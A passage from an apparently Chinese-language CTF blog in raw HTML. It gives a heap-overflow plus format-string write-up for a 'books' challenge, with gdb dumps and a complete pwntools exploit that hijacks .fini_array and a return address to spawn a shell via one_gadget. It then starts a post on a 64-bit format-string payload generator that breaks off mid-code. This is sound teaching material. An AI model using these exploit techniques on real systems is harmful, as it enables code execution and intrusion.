class="line">0x1b8d220:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d230:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d240:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d250:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d270:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d310:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>编辑第一块堆块内容，溢出到第二块的size，修改第二块的size为0x150，为什么是0x150?(因为你看程序在合并的时候有个malloc(0x140)，这样合并的时候申请的堆块就会跑到这上面来，也就是说我们第二块堆块跟第三块堆块这时候会重合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x1695028-0x28</span><br><span class="line">0x1695000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x1695010:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x1695020:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x1695030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695080:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x1695090:	0x0000000000000000	0x0000000000000151</span><br><span class="line">0x16950a0:	0x00007f0e99412b00	0x00007f0e99412b78</span><br><span class="line">0x16950b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695120:	0x0000000000000090	0x0000000000000090</span><br><span class="line">0x1695130:	0x64726f2072756f59	0x7573207369207265</span><br><span class="line">0x1695140:	0x2164657474696d62	0x000000000000000a</span><br><span class="line">0x1695150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后submit的时候具体会变成什么样呢?，会先复制<strong>Order 1: **，然后在复制chunk1里的内容，在复制chunk2里的内容，注意注意chunk2的内容现在是什么，是前面的</strong>Order 1: **在加上chunk1的内容，因为堆块2的指针还指向chunk2的数据部分，所以会复制两次</p>
</li>
<li><p>就是<strong>Order 1: **+chunk1+’\n’+</strong>Order 2: <strong>+</strong>Order 1: **+chun1+’\n’</p>
</li>
<li><p>如果我们要利用格式化字符串的洞的话，要精确复制到堆块3的size部分后就停止，到这部分大小是0x90</p>
</li>
<li><p>也就是说我们<strong>Order 1: **+chunk1+’\n’+</strong>Order 2: <strong>+</strong>Order 1: *<em>这个的大小要为0x90，求出chunk大小，0x90-9</em>3-1=0x88-0x1c=0x74</p>
</li>
<li><p>所以我们可以在前面0x74里写格式化字符串的利用，后面就利用得上了</p>
</li>
</ol>
<p>这是合并后的结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/56gx 0x6e6028-0x28</span><br><span class="line">0x6e6000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x6e6010:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x6e6020:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x6e6030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6080:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x6e6090:	0x0000000000000000	0x0000000000000151</span><br><span class="line">0x6e60a0:	0x3a3120726564724f	0x2563373136322520</span><br><span class="line">0x6e60b0:	0x3325516e68243331	0x2438322550702431</span><br><span class="line">0x6e60c0:	0x6161616161616170	0x6161616161616161</span><br><span class="line">0x6e60d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e60e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e60f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6100:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6110:	0x6161616161616161	0x724f0a6161616161</span><br><span class="line">0x6e6120:	0x4f203a3220726564	0x203a312072656472</span><br><span class="line">0x6e6130:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x6e6140:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x6e6150:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6160:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6170:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6180:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6190:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e61a0:	0x64724f0a61616161	0x000a203a32207265</span><br><span class="line">0x6e61b0:	0x0000000000000000	0x0000000000000411</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>既然是堆题我就不再讲格式化字符串利用了，后面先利用格式化字符串修改.fini的地址，这样能多返回一次到main函数，同时泄露libc函数地址，为什么修改.fini里的地址能多返回一次main函数呢，请看</li>
</ol>
<p><a href="https://luomuxiaoxiao.com/?p=516" target="_blank" rel="noopener">linux_x86程序启动中文版</a><br><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">linux_x86程序启动英文版</a><br>这两篇文章一样的，不过一个中文版，一个英文版，建议英文好的同学读原版，因为.fini在exit前会进行调用，所以修改后能执行多一次main函数</p>
<ol start="9">
<li>这时候发觉泄露出libc后不知道修改哪个函数了，因为调用printf后再也没函数用了，这时候思路又断了</li>
<li>所以这时候想想别的办法，发觉栈上存了一个与存main函数返回地址的指针存在一定偏移的地址，所以泄露出来后，在减掉那个固定偏移就可以修改main函数返回地址了</li>
</ol>
<p>注意：这里格式化字符串内容存在堆里，指针存在栈上，所以我们fgets输入的才是对应上的偏移</p>
<h3 id="1-2-4-exp"><a href="#1-2-4-exp" class="headerlink" title="1.2.4. exp"></a>1.2.4. exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'books'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'books'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    p = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span> :</span></span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvregex(<span class="string">r'''Enter (.*?) order:\n'''</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span> :</span></span><br><span class="line">    p.sendline(str(idx+<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(content)</span> :</span></span><br><span class="line">    p.sendline(<span class="string">'5'</span>+ <span class="string">'\x00'</span>*<span class="number">7</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    fini_array = <span class="number">0x6011B8</span></span><br><span class="line">    main_addr = <span class="number">0x400A39</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#first step </span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    fmstr = <span class="string">"%&#123;&#125;c%&#123;&#125;$hnQ%&#123;&#125;$pP%&#123;&#125;$p"</span>.format(<span class="number">0xA39</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">28</span>)</span><br><span class="line">    payload = fmstr.ljust(<span class="number">0x74</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x88</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x151</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    <span class="comment">#offset=13</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    submit(p64(fini_array))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        p.recvuntil(<span class="string">'Q'</span>)</span><br><span class="line">    __libc_start_main_addr = int(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]<span class="number">-240</span></span><br><span class="line">    ret_addr = int(p.recv(<span class="number">15</span>)[<span class="number">1</span>:], <span class="number">16</span>)<span class="number">-0x1e8</span></span><br><span class="line">    one_gadget_offset = <span class="number">0x45216</span> </span><br><span class="line">    <span class="comment">#one_gadget_offset = 0x4526a </span></span><br><span class="line">    <span class="comment">#one_gadget_offset = 0xf02a4</span></span><br><span class="line">    <span class="comment">#one_gadget_offset = 0xf1147</span></span><br><span class="line">    one_gadget = libc_base + one_gadget_offset</span><br><span class="line">    p.success(<span class="string">"libc_base-&gt; 0x%x"</span> % libc_base)</span><br><span class="line">    p.success(<span class="string">"ret_addr-&gt; 0x%x"</span> % ret_addr)</span><br><span class="line">    p.success(<span class="string">"one_gadget-&gt; 0x%x"</span> % one_gadget)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#second step</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    part1 = ((one_gadget&gt;&gt;<span class="number">16</span>)&amp; <span class="number">0xffff</span>)</span><br><span class="line">    part2 = (one_gadget &amp; <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line">    part =[</span><br><span class="line">        (part1, p64(ret_addr+<span class="number">2</span>)),</span><br><span class="line">        (part2, p64(ret_addr))</span><br><span class="line">    ]</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    size = [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> part]</span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    print(size)</span><br><span class="line">    print(addr)</span><br><span class="line">    fmstr = <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(size[<span class="number">0</span>], <span class="number">13</span>)</span><br><span class="line">    fmstr += <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(size[<span class="number">1</span>]-size[<span class="number">0</span>], <span class="number">14</span>)</span><br><span class="line">    payload = fmstr.ljust(<span class="number">0x74</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x88</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x151</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    <span class="comment">#offset=13</span></span><br><span class="line">    submit(addr)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="1-3-总结"><a href="#1-3-总结" class="headerlink" title="1.3. 总结"></a>1.3. 总结</h2><ol>
<li>这道题堆部分难点部分想到了就不难，没想到就难，就是要利用那个部分溢出到第三个堆块</li>
<li>其余部分就全是格式化字符串的利用了，没什么好讲的</li>
<li>这道题拿到shell也偏废时间，最主要直接看exp我看不懂，后面去看文章才看懂的</li>
</ol>
<h2 id="1-4-参考链接"><a href="#1-4-参考链接" class="headerlink" title="1.4. 参考链接"></a>1.4. 参考链接</h2><p><a href="https://bbs.pediy.com/thread-246783.htm" target="_blank" rel="noopener">看雪大佬的文章</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/05/10/pwn-format64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/05/10/pwn-format64/" class="post-title-link" itemprop="url">64位格式化字符串自动篇</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-05-10 23:50:30" itemprop="dateCreated datePublished" datetime="2019-05-10T23:50:30+08:00">2019-05-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:59:16" itemprop="dateModified" datetime="2019-10-30T17:59:16+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" itemprop="url" rel="index">
                    <span itemprop="name">格式化字符串</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>3.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="64位格式化字符串之自动化脚本编写"><a href="#64位格式化字符串之自动化脚本编写" class="headerlink" title="64位格式化字符串之自动化脚本编写"></a>64位格式化字符串之自动化脚本编写</h1><p>前言：pwntools的工具只支持32位格式化字符串，我每次做64位格式化字符串的题目都是手动调试了很久，做一道题调试得花个大半部分时间，然后再编写exp，所以我近几天在研究如何自动化的生成payload，让我能够轻松不调试一波梭，在了解原理过后，我便开始了我的编写之路。</p>
<h2 id="fmt-payload之写入篇"><a href="#fmt-payload之写入篇" class="headerlink" title="fmt_payload之写入篇"></a>fmt_payload之写入篇</h2><p>先补充个知识：</p>
<ul>
<li>%hhn写入的是一个字节</li>
<li>%hn写入的是两个字节</li>
<li>%n写入的是四个字节<h3 id="栈偏移位置的确定"><a href="#栈偏移位置的确定" class="headerlink" title="栈偏移位置的确定"></a>栈偏移位置的确定</h3></li>
<li>以前都是手动调试的，然后调试多次过后发觉了规律：</li>
<li>他的位置就是开头6个寄存器加上你输入的payload长度/8，</li>
<li>因为64位程序以8个字节为一个单位，也就是说，你输入了40个字节的字符串，偏移位置就是11</li>
</ul>
<h3 id="大小的选择"><a href="#大小的选择" class="headerlink" title="大小的选择"></a>大小的选择</h3><ul>
<li>因为他是按已输出字符来写入的，如果你大的放前面，小的在后面就没法写入了，所以需要进行排序</li>
</ul>
<p>了解这两个过程后，我们便可以开始进行脚本的编写了</p>
<h3 id="脚本的编写"><a href="#脚本的编写" class="headerlink" title="脚本的编写"></a>脚本的编写</h3><h4 id="获得你需要写入的内容"><a href="#获得你需要写入的内容" class="headerlink" title="获得你需要写入的内容"></a>获得你需要写入的内容</h4><p>我是按一个字节一个字节写入的，所以我需要获得每个字节的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAddr</span><span class="params">(write)</span>:</span></span><br><span class="line">    xor = <span class="number">0xff</span></span><br><span class="line">    addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        result = (xor &amp; write) &gt;&gt; (i * <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">            addr.append(result)</span><br><span class="line">        xor = xor * <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure>
<p>解释下，在每个字节的对应位置 &amp; 0xff便可以获得那个位置的内容</p>
<h4 id="划分部分"><a href="#划分部分" class="headerlink" title="划分部分"></a>划分部分</h4><p>因为我需要将被写入的地址以及他们的内容对应起来，并进行排序，小的优先写，然后大的放后面，所以就要进行划分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Partion</span><span class="params">(write, bewrite)</span>:</span></span><br><span class="line">    addr = getAddr(write)</span><br><span class="line">    part = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">        part.append( (addr[i], p64(bewrite+i)) )</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>]) <span class="comment">#进行排序，按内容大小来排</span></span><br><span class="line">    <span class="keyword">return</span> part</span><br></pre></td></tr></table></figure>
<h4 id="获取排序后的数组"><a href="#获取排序后的数组" class="headerlink" title="获取排序后的数组"></a>获取排序后的数组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sizeUp</span><span class="params">(part)</span>:</span></span><br><span class="line">    size = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(part)):</span><br><span class="line">        size.append(part[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> size</span><br></pre></td></tr></table></figure>

<h4 id="将地址进行打包"><a href="#将地址进行打包" class="headerlink" title="将地址进行打包"></a>将地址进行打包</h4><p>因为我是将地址放在后面的，防止00截断，然后在将排序后的地址按顺序打包起来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packAddr</span><span class="params">(part)</span>:</span></span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    address = <span class="string">''</span>.join(addr)</span><br><span class="line">    <span class="keyword">return</span> address</span><br></pre></td></tr></table></figure>

<h4 id="处理偏移"><a href="#处理偏移" class="headerlink" title="处理偏移"></a>处理偏移</h4><p>自动进行计算偏移，原因我已经说过了，通过计算是可以得出偏移位置的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offsetDeal</span><span class="params">(size)</span>:</span></span><br><span class="line">    length = <span class="number">12</span> * len(size)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        offset = length / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset = length / <span class="number">8</span></span><br><span class="line">    length = offset * <span class="number">8</span> </span><br><span class="line">    offset += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> offset, length</span><br></pre></td></tr></table></figure>

<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><p>只是将对应位置和对应偏移的payload搞定</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payloadGenerate</span><span class="params">(size, offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[<span class="number">0</span>], offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(size)):</span><br><span class="line">        payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[i]-size[i<span class="number">-1</span>],offset+i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<h4 id="主要函数，生成完整payload"><a href="#主要函数，生成完整payload" class="headerlink" title="主要函数，生成完整payload"></a>主要函数，生成完整payload</h4><ol>
<li>首先获得划分并排序后的数组，就是地址和写入内容对应的数组</li>
<li>获得对应的大小，方便后面格式化</li>
<li>获得打包后的地址，方便后面添加</li>
<li>然后处理偏移和地址的对齐，64位按8个字节这样对齐</li>
<li>生成payload并进行对齐</li>
<li>offset可选，防止意外，自行找offset</li>
<li>返回payload<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_payload</span><span class="params">(bewrite,  write, offset=<span class="number">0</span> )</span>:</span></span><br><span class="line">    part = Partion(write, bewrite)</span><br><span class="line">    size = sizeUp(part)</span><br><span class="line">    address = packAddr(part)</span><br><span class="line"></span><br><span class="line">    result = offsetDeal(size)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        offset = result[<span class="number">0</span>]</span><br><span class="line">    length = result[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    payload = payloadGenerate(size, offset)</span><br><span class="line">    payload = payload.ljust(length, <span class="string">'a'</span>)</span><br><span class="line">    payload 